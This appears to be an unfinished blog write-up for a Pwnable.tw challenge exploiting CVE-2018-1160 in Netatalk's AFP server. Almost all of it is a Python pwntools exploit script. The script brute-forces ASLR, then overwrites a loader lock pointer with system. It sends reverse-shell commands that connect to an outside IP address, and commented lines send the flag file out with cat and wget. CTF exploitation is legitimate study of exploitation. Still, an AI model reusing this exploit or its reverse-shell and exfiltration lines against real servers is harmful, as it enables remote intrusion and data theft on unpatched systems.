---
layout: post
title: "CVE-2018-1160: Netatalk RCE"
date: 2022-07-15
permalink: /:title/
description: "Exploitation of an Apple Filing Protocol Server"
tags: [ctf]
share: true
comments: false
published: true
status: ongoing
---

**This is almost finished, the final exploit needs its offsets to be adjusted against the challenge's server.**  
**I'll write an actual writeup as soon as I get it working, stay tuned!**  

~~This is the solution to a Pwnable.tw challenge, as well as an n-day exploit.~~
~~The most troublesome part is finding the correct offset against a Ubuntu 16.04 (Kernel x86-64 4.9.0)~~


```python
from pwn import *

elf = ELF('./afpd')
libc = ELF('./libc-18292bd12d37bfaf58e8dded9db7f1f5da1192cb.so')

DSI_FLAGS = {
    "request": 0x0,
    "response": 0x1
}

DSI_CMD = {
    "get_status": 0x3,
    "open_sess": 0x4,
    "tickle": 0x5
}

def new_dsi_header(flag, command, request_id, offset, data_len):

    DSI_FLAGS = p8(flag, endian='big')
    DSI_COMMAND = p8(command, endian='big')
    DSI_REQUEST_ID = p16(request_id, endian='big')
    DSI_ERROR = p32(offset, endian='big')
    DSI_DATA_LENGTH = p32(data_len, endian='big')
    DSI_RESERVED = p32(0x0, endian='big')

    pck  = DSI_FLAGS
    pck += DSI_COMMAND
    pck += DSI_REQUEST_ID
    pck += DSI_ERROR
    pck += DSI_DATA_LENGTH
    pck += DSI_RESERVED

    return pck

def send_afp(payload, req_id=0x0):

    if args['REMOTE']:
        io = remote("chall.pwnable.tw", 10002)
    else:
        io = remote("localhost", 5566)

    context(endian='big')

    error_code = 0x0

    p = p8(0x1, endian='big')
    p += p8(24, endian='big')
    p += p32(0x41414141)
    p += p32(0x42424242)
    p += p32(0x66666666)    # server quantum
    p += p32(0x43434343)    # client/server id
    p += payload            # cmd pointer

    packet = new_dsi_header(DSI_FLAGS["request"], DSI_CMD["open_sess"], req_id, error_code, len(p))
    packet += p

    io.send(packet)
    # try:
    io.recv()
    # except:
    #     1+1
    
    trigger = reverse_shell.ljust(0x5f8, b"\x00") + p64(libc_base + libc.symbols['system'], endian='little')

    packet = new_dsi_header(DSI_FLAGS["request"], DSI_CMD["open_sess"], req_id, error_code, len(trigger))
    packet += trigger

    io.send(packet)
    io.close()

def bruteforce_aslr():
    context(endian='big')
    leak_addr = b''

    if args['SKIP']:
        return int(args['SKIP'], 0)

    for b in range(8):
        for i in range(256):
            if args['REMOTE']:
                io = remote("chall.pwnable.tw", 10002, level='error')
            else:
                io = remote("localhost", 5566, level='error')

            payload = b"\x01" + p8(0x11 + b) + b"a"*0x10 + leak_addr + p8(i)
            dsi  = b"\x00\x04\x00\x01"
            dsi += p32(0)
            dsi += p32(len(payload))
            dsi += p32(0)
            dsi += payload
            io.send(dsi)
            try:
                a = io.recv()
                leak_addr += p8(i)
                log.success(str(hex(i)))
                io.close()
                break
            except:
                io.close()

    log.success(hex(u64(leak_addr,endian='little')))

    return int.from_bytes(leak_addr, 'little')

rtld_off = 0x61b060
# rtld_off = 0xed2060
_dl_load_lock_off = 2312
leaked_addr = bruteforce_aslr()
if args['LIBC_OFF']:
    libc_base = leaked_addr + 0x5c12000
    # libc_base = leaked_addr + 0x535a000
    # libc_base = leaked_addr - 0xca1000
    rtld_addr = libc_base + rtld_off + _dl_load_lock_off

    print("libc addr: "  + hex(libc_base))
    print("rtld addr: "  + hex(rtld_addr))

    if args["REMOTE"]:
        reverse_shell = b'bash -c "bash -i >& /dev/tcp/139.177.180.170/12345 0<&1" \x00'
        # reverse_shell = b'bash -c "cat /home/netatalk/flag > /dev/tcp/139.177.180.170/12345" \x00'
        # reverse_shell = b'wget http://139.177.180.170:12345/$(cat /home/CVE-2018-1160/flag)'
        # reverse_shell = b'wget http://139.177.180.170:12345'
    else:
        reverse_shell = b'bash -c "bash -i >& /dev/tcp/139.177.180.170/12345 0>&1"'
        # reverse_shell = b'bash -c "bash -i >& /dev/tcp/139.162.130.143/12345 0>&1"'

    try:
        send_afp(p64(rtld_addr, endian='little'))
    except:
        log.info("failed")
else:
    for offset in range(0, 0xffff000, 0x1000):
        libc_base = leaked_addr + offset # this works locally, not sure about the remote server
        rtld_addr = libc_base + rtld_off + _dl_load_lock_off

        print("libc addr: "  + hex(libc_base))
        print("rtld addr: "  + hex(rtld_addr))

        reverse_shell = b'bash -c "bash -i >& /dev/tcp/139.177.180.170/12345 0>&1"'

        try:
            send_afp(p64(rtld_addr, endian='little'))
        except:
            log.info("trying again...")

```


